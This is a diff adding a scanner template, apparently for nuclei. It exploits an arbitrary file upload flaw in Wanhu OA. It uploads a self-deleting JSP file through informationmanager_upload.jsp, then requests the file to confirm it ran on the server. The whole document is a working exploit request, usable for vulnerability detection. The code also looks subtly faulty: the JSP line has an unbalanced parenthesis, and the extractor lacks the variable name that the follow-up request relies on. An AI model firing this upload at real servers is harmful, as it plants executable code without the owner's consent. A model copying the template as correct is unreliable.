@@ -1,0 +1,54 @@
+id: poc-yaml-wan-hu-oa-informationmanager-upload-jsp-anyfile-upload
+info:
+  name: Wanhu OA informationmanager_upload.jsp Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null"
+    headers:
+      Content-Type: "multipart/form-data; boundary=ffb3cc4faa19bf85108f166d3069705f"
+    body: |-
+      --ffb3cc4faa19bf85108f166d3069705f
+      Content-Disposition: form-data; name="file1"; filename="{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <%out.println(new String("{{t2}}")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      --ffb3cc4faa19bf85108f166d3069705f--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "opener.document.all.null.value"
+        part: body
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "opener\\.document\\.all\\.null\\.value\\s*=\\s*\\\"(?P<tmpFIle>[^\\\"]+)"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/defaultroot/upload/information/{{tmpFIle}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
